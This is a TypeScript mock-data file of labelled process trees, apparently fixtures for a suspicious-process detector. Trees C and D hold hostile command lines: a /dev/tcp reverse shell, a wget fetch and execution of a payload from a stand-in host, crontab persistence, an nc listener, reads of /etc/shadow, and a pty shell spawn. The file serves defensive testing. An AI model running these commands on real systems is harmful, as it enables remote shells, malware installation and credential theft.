/**
 * Mock process tree data. Each tree groups related processes by PPID chain.
 * Tree A: Normal system boot chain
 * Tree B: Cron job chain
 * Tree C: SUSPICIOUS — reverse shell chain (anomalous)
 * Tree D: Web server exploitation chain (anomalous)
 * Tree E: Normal developer workflow
 */

export interface ProcessNode {
  pid: number;
  ppid: number;
  uid: number;
  executable_path: string;
  command_line: string;
  timestamp: string;
  children?: ProcessNode[];
}

export interface ProcessTree {
  tree_id: string;
  label: string;
  is_suspicious: boolean;
  root: ProcessNode;
}

export const MOCK_PROCESS_TREES: ProcessTree[] = [
  {
    tree_id: "tree-A",
    label: "System Initialization",
    is_suspicious: false,
    root: {
      pid: 1,
      ppid: 0,
      uid: 0,
      executable_path: "/sbin/init",
      command_line: "/sbin/init splash",
      timestamp: "2026-03-17T07:45:00.001Z",
      children: [
        {
          pid: 423,
          ppid: 1,
          uid: 0,
          executable_path: "/usr/sbin/sshd",
          command_line: "sshd -D",
          timestamp: "2026-03-17T07:45:00.150Z",
          children: [
            {
              pid: 512,
              ppid: 423,
              uid: 1000,
              executable_path: "/usr/bin/bash",
              command_line: "bash",
              timestamp: "2026-03-17T07:45:01.200Z",
              children: [],
            },
          ],
        },
        {
          pid: 200,
          ppid: 1,
          uid: 0,
          executable_path: "/usr/bin/journald",
          command_line: "systemd-journald",
          timestamp: "2026-03-17T07:45:19.000Z",
          children: [
            {
              pid: 201,
              ppid: 200,
              uid: 0,
              executable_path: "/usr/bin/logrotate",
              command_line: "logrotate /etc/logrotate.conf",
              timestamp: "2026-03-17T07:45:20.000Z",
              children: [],
            },
          ],
        },
      ],
    },
  },
  {
    tree_id: "tree-B",
    label: "Cron Job Execution",
    is_suspicious: false,
    root: {
      pid: 700,
      ppid: 1,
      uid: 0,
      executable_path: "/usr/sbin/cron",
      command_line: "cron -f",
      timestamp: "2026-03-17T07:45:04.000Z",
      children: [
        {
          pid: 701,
          ppid: 700,
          uid: 0,
          executable_path: "/usr/bin/find",
          command_line: "find /var/log -mtime +7 -delete",
          timestamp: "2026-03-17T07:45:05.000Z",
          children: [],
        },
      ],
    },
  },
  {
    tree_id: "tree-C",
    label: "Reverse Shell Attack",
    is_suspicious: true,
    root: {
      pid: 1337,
      ppid: 512,
      uid: 0,
      executable_path: "/tmp/.x/shell",
      command_line: "/tmp/.x/shell -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      timestamp: "2026-03-17T07:45:09.000Z",
      children: [
        {
          pid: 1338,
          ppid: 1337,
          uid: 0,
          executable_path: "/usr/bin/wget",
          command_line: "wget http://malicious.example/payload -O /tmp/.x/p",
          timestamp: "2026-03-17T07:45:09.100Z",
          children: [
            {
              pid: 1339,
              ppid: 1338,
              uid: 0,
              executable_path: "/tmp/.x/p",
              command_line: "/tmp/.x/p --install --persist",
              timestamp: "2026-03-17T07:45:09.200Z",
              children: [
                {
                  pid: 1340,
                  ppid: 1339,
                  uid: 0,
                  executable_path: "/usr/bin/chmod",
                  command_line: "chmod +x /tmp/.x/p",
                  timestamp: "2026-03-17T07:45:09.300Z",
                  children: [],
                },
                {
                  pid: 1341,
                  ppid: 1339,
                  uid: 0,
                  executable_path: "/usr/bin/crontab",
                  command_line: "crontab -e",
                  timestamp: "2026-03-17T07:45:09.400Z",
                  children: [
                    {
                      pid: 1342,
                      ppid: 1341,
                      uid: 0,
                      executable_path: "/usr/bin/nc",
                      command_line: "nc -lvnp 5555",
                      timestamp: "2026-03-17T07:45:09.500Z",
                      children: [],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    tree_id: "tree-D",
    label: "Web Shell Exploitation",
    is_suspicious: true,
    root: {
      pid: 900,
      ppid: 1,
      uid: 33,
      executable_path: "/usr/sbin/apache2",
      command_line: "apache2 -DFOREGROUND",
      timestamp: "2026-03-17T07:45:10.000Z",
      children: [
        {
          pid: 901,
          ppid: 900,
          uid: 33,
          executable_path: "/bin/sh",
          command_line: "sh -c id; whoami; cat /etc/passwd",
          timestamp: "2026-03-17T07:45:11.000Z",
          children: [
            {
              pid: 902,
              ppid: 901,
              uid: 0,
              executable_path: "/usr/bin/id",
              command_line: "id",
              timestamp: "2026-03-17T07:45:11.200Z",
              children: [],
            },
            {
              pid: 903,
              ppid: 901,
              uid: 0,
              executable_path: "/usr/bin/cat",
              command_line: "cat /etc/shadow",
              timestamp: "2026-03-17T07:45:11.300Z",
              children: [
                {
                  pid: 960,
                  ppid: 903,
                  uid: 0,
                  executable_path: "/usr/bin/python3",
                  command_line: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                  timestamp: "2026-03-17T07:45:12.000Z",
                  children: [
                    {
                      pid: 961,
                      ppid: 960,
                      uid: 0,
                      executable_path: "/bin/bash",
                      command_line: "bash",
                      timestamp: "2026-03-17T07:45:12.500Z",
                      children: [],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    tree_id: "tree-E",
    label: "Developer Build Workflow",
    is_suspicious: false,
    root: {
      pid: 1500,
      ppid: 512,
      uid: 1000,
      executable_path: "/usr/bin/git",
      command_line: "git clone https://github.com/org/repo.git",
      timestamp: "2026-03-17T07:45:16.000Z",
      children: [
        {
          pid: 1501,
          ppid: 1500,
          uid: 1000,
          executable_path: "/usr/bin/make",
          command_line: "make install",
          timestamp: "2026-03-17T07:45:17.000Z",
          children: [
            {
              pid: 1502,
              ppid: 1501,
              uid: 0,
              executable_path: "/usr/bin/install",
              command_line: "install -m 755 binary /usr/local/bin/binary",
              timestamp: "2026-03-17T07:45:18.000Z",
              children: [],
            },
          ],
        },
      ],
    },
  },
];
